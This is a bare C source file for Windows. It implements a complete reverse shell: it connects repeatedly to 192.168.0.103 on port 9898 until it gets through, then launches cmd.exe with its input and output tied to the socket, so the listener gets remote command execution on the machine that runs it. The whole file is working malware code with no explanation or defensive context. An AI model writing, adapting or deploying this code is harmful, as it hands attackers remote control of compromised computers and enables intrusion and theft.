#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <locale.h>

#pragma comment(lib, "Ws2_32.lib") 

int main() {
    setlocale(LC_ALL, "");
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return WSAGetLastError();
    }

    ADDRINFOW addrinfo = { 0 }, * result;
    addrinfo.ai_socktype = SOCK_STREAM;
    addrinfo.ai_family = AF_INET;
    if (GetAddrInfo(L"192.168.0.103", L"9898", &addrinfo, &result) != 0) {
        return WSAGetLastError();
    }


    SOCKET sc;
    sc = WSASocket(result->ai_family, result->ai_socktype, result->ai_protocol, NULL,NULL,NULL);
    int iResult = WSAGetLastError();
    while (WSAConnect(sc, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL) != 0) {
        Sleep(5000);
    }

    STARTUPINFO startinf;
    PROCESS_INFORMATION pi;
    memset(&startinf, 0, sizeof(startinf));
    startinf.cb = sizeof(startinf);
    startinf.hStdInput = startinf.hStdOutput = startinf.hStdError = (HANDLE)sc;
    startinf.dwFlags = STARTF_USESTDHANDLES;
    wchar_t cmdline[] = L"C:\\Windows\\System32\\cmd.exe";
    CreateProcess(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &startinf, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    closesocket(sc);
    WSACleanup();

    return 0;
}